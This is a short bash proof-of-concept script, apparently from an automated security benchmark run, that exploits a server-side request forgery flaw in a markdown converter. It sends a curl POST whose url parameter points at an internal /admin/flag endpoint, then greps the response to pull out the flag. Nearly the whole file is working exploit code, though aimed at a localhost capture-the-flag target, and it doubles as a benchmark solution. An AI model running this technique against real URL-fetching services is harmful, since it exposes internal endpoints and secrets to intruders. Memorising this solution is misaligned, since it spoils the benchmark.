#!/bin/bash
# POC: SSRF vulnerability in /convert endpoint - demonstrates accessing internal /admin/flag endpoint via URL parameter
# Target: ./repo
# Created: 2025-11-04T17:29:34.464Z
# Session: benchmark-XBEN-033-24-mhkubvue

# SSRF Vulnerability POC - Markdown Converter URL Parameter
# Demonstrates arbitrary URL fetching via /convert endpoint
# Target: http://localhost:80/convert with url parameter pointing to internal /admin/flag

TARGET_URL="http://localhost:80/convert"
INTERNAL_ENDPOINT="http://localhost:80/admin/flag"

echo "[*] SSRF Vulnerability POC - Markdown Converter"
echo "[*] Target: $TARGET_URL"
echo "[*] Fetching internal endpoint: $INTERNAL_ENDPOINT"
echo ""

# Attempt SSRF via url parameter
echo "[*] Sending SSRF payload..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=$INTERNAL_ENDPOINT")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Check if we got the flag in the response
if echo "$RESPONSE" | grep -q "flag{"; then
    echo "[+] SUCCESS! SSRF vulnerability confirmed!"
    echo "[+] Retrieved sensitive flag content from internal endpoint:"
    FLAG=$(echo "$RESPONSE" | grep -o "flag{[^}]*}" || echo "$RESPONSE" | grep -o "flag{[^<]*" | head -1)
    echo "[+] Flag: $FLAG"
    exit 0
else
    echo "[-] Response does not contain expected flag format"
    echo "[-] Full response body:"
    echo "$RESPONSE"
    exit 1
fi